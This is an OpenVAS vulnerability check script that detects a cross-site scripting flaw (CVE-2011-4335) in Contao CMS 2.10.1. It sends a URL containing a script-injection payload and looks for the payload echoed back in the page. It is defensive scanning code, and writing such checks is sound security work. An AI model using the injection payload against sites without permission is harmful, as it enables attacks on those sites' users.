###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_contao_50061.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Contao CMS Cross-Site Scripting Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Contao is prone to a cross-site scripting vulnerability because it
fails to properly sanitize user-supplied input.

An attacker may leverage this issue to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and to launch other attacks.

Contao 2.10.1 is vulnerable; other versions may also be affected.";

tag_solution = "Vendor updates are available. Please see the references for details.";

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.103352");
 script_bugtraq_id(50061);
 script_cve_id("CVE-2011-4335");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_version("$Revision: 9351 $");

 script_name("Contao CMS Cross-Site Scripting Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/50061");
 script_xref(name : "URL" , value : "http://www.contao.org/");
 script_xref(name : "URL" , value : "http://dev.contao.org/projects/typolight/repository/revisions/1041");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/520046");
 script_xref(name : "URL" , value : "http://www.rul3z.de/advisories/SSCHADV2011-025.txt");

 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2011-12-02 11:09:47 +0100 (Fri, 02 Dec 2011)");
 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!can_host_php(port:port))exit(0);

foreach dir( make_list_unique( "/contao", "/cms", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
   
  url = string(dir,'/index.php/teachers.html?"/><script>alert(/openvas-xss-test/)</script>');

  if(http_vuln_check(port:port, url:url, pattern:"<script>alert\(/openvas-xss-test/\)</script>", extra_check:"This website is powered by Contao", check_header:TRUE ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
